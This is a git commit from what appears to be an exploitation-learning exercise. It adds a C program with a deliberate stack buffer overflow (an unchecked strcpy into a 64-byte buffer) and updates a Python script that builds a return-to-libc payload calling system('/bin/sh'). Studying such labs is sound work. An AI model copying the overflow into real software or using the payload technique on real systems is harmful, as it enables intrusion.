268a9cd0e5f425885d5b54ed9d66e3a9365ca513
SaiVK <saiganesha5.svkv@gmail.com>
2021-04-23 00:22:25 -0400

    Added Ret_2_Libc

--- ret_2_libc_payload.py
+++ ret_2_libc_payload.py
@@ -1,9 +1,10 @@
-bin_sh_addr = b"\xf1\x57\x0b\x08" # 0x80b57f1
-return_address = b"\x39\x17\x05\x08" #  libc_system() 0x8051730
+bin_sh_addr = b"\x45\xc1\x0b\x08" # 0x80bc140, 0x80bba28
+system_addr = b"\x30\xef\x04\x08" #  libc_system() 0x804ef30
+exit_addr = b"\x30\xe4\x04\x08" # exit() 0x804e430
 fill = b"0"*7*4
 
 
-payload = fill + return_address + b"A"*4 + bin_sh_addr
+payload = fill + system_addr + exit_addr + bin_sh_addr
 print (payload)
 f = open("exploit_ret_2_libc.exp", "wb")
 f.write(payload)
---
+++ vuln.c
@@ -0,0 +1,19 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void vuln(char *s)
+{
+    char buffer[64];
+    strcpy(buffer, s);
+}
+
+int main(int argc, char **argv)
+{
+    if (argc == 1) {
+        fprintf(stderr, "Enter a string!\n");
+        exit(EXIT_FAILURE);
+    }
+    vuln(argv[1]);
+    printf("Done!\n");
+}
